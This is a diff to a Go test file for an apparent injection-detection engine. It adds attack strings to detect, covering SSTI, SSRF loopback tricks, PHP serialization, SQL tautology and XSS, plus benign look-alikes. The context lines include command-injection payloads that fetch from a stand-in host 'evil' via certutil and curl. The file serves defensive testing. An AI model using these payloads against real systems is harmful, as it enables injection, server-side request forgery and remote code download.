@@ -30,6 +30,14 @@ func TestSemanticEngine_EvasionHardening(t *testing.T) {
 		{"CmdI Windows certutil", `;certutil -urlcache -f http://evil/x y`},
 		{"CmdI extension suffixed binary", `|curl.exe http://evil`},
 		{"CmdI tokenizer non-progress shape", `;id(`},
+		{"SSTI sensitive config object", `pref={{ config }}`},
+		{"SSTI twig statement block", `payload={% set x = 1 %}`},
+		{"SSTI ruby arithmetic canary", `#{7*7}`},
+		{"PHP serialized array", `a:1:{s:1:"a";s:1:"b";}`},
+		{"SSRF loopback literal", `http://127.0.0.1:8080/admin`},
+		{"SSRF octal loopback", `http://0177.0.0.1/`},
+		{"SQL unquoted boolean tautology", `1 or true`},
+		{"XSS xmp raw-text smuggling", `<xmp><img src=x onerror=alert(1)></xmp>`},
 	}
 
 	engine := NewSemanticEngine()
@@ -69,6 +77,13 @@ func TestSemanticEngine_HardeningBenignValues(t *testing.T) {
 		`a & b`,
 		`rock 'n' roll`,
 		`Hello "world"`,
+		`{{ username }}`,
+		`{{ request_id }}`,
+		`1 or 2`,
+		`Chapter 1 or true stories`,
+		`note=a:1`,
+		`redirect=http://localhost:3000/callback`,
+		`fetch=https://10.1.2.3/admin`,
 	}
 
 	engine := NewSemanticEngine()
